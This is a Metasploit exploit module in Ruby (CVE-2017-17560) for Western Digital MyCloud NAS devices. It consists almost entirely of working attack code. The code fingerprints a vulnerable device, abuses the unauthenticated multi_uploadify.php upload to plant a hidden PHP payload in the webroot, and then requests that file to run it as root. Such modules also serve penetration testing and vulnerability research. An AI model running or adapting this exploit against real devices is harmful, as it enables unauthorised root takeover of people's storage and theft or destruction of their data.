# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  HttpFingerprint = { :method => &#039;HEAD&#039;, :uri => &#039;/web/&#039;, :pattern => [/Apache/] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Western Digital MyCloud multi_uploadify File Upload Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a file upload vulnerability found in Western Digital&#039;s MyCloud
        NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php
        PHP script provides multipart upload functionality that is accessible without authentication
        and can be used to place a file anywhere on the device&#039;s file system. This allows an
        attacker the ability to upload a PHP shell onto the device and obtain arbitrary code
        execution as root.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Zenofex <zenofex[at]exploitee.rs>&#039; # Initial vulnerability discovery, PoC, and Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29&#039;],
          [&#039;URL&#039;, &#039;https://download.exploitee.rs/file/generic/Exploiteers-DEFCON25.pdf&#039;],
          [&#039;URL&#039;, &#039;https://www.youtube.com/watch?v=EO_49pfmA5A&#039;],
          [&#039;CVE&#039;, &#039;2017-17560&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jul 29 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def check
    res = send_request_cgi(&#039;uri&#039; => &#039;/web/jquery/uploader/multi_uploadify.php&#039;)

    if res.nil?
      vprint_error(&#039;Connection failed&#039;)
      return CheckCode::Unknown
    end

    if res.code == 302 && res.headers[&#039;Location&#039;] =~ /\?status=1/
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  def upload(web_folder, fname, file)
    # construct post data
    data = Rex::MIME::Message.new
    data.add_part(file, &#039;application/x-php&#039;, nil, "form-data; name=\"Filedata[]\"; filename=\"#{fname}\"")

    # upload
    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => &#039;/web/jquery/uploader/multi_uploadify.php&#039;,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    => data.to_s,
      &#039;vars_get&#039; => {
        &#039;folder&#039; => web_folder
      }
    })
  end

  def exploit
    if check != CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, &#039;Target does not appear to be a vulnerable Western Digital MyCloud device&#039;)
    end

    # upload PHP payload to &#039;/var/www&#039; (webroot).
    web_folder = &#039;/var/www&#039;
    php   = "<?php #{payload.encoded} ?>"
    print_status("Uploading PHP payload (#{php.length} bytes) to &#039;#{web_folder}&#039;.")
    fname = ".#{rand_text_alphanumeric(rand(10) + 6)}.php"

    res = upload(web_folder, fname, php)

    # check upload response
    fail_with(Failure::Unreachable, &#039;No response received from the target.&#039;) unless res
    if res.code != 302 || res.headers[&#039;Location&#039;] =~ /\?status=0/
      fail_with(Failure::UnexpectedReply, "Unexpected reply (#{res.body.length} bytes)")
    end
    print_good(&#039;Uploaded PHP payload successfully.&#039;)

    # register uploaded php payload file for cleanup
    register_files_for_cleanup(fname)

    # retrieve and execute PHP payload
    print_status("Making request for &#039;/#{fname}&#039; to execute payload.")
    res = send_request_cgi({&#039;uri&#039; => normalize_uri(fname)}, 15)
  end

end

